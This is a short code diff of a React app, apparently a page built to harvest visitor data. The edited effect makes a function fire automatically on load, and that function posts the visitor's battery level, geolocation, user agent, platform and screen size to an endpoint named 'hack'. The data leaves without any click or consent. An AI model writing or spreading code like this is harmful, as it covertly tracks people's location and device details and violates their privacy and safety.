@@ -61,8 +61,10 @@ function App() {
   }, []);
 
   useEffect(() => {
-    handleClick()
-  }, [batteryLevel, mylocation, userAgent, platform, inches])
+    if (batteryLevel !== null) {
+      handleClick();
+    }
+  }, [batteryLevel, mylocation, userAgent, platform, inches]);
 
   async function handleClick() {
     await request.post("hack", { precentBattery: batteryLevel, location: mylocation, informationSystems: userAgent, operatingSystems: platform, dyum: inches });
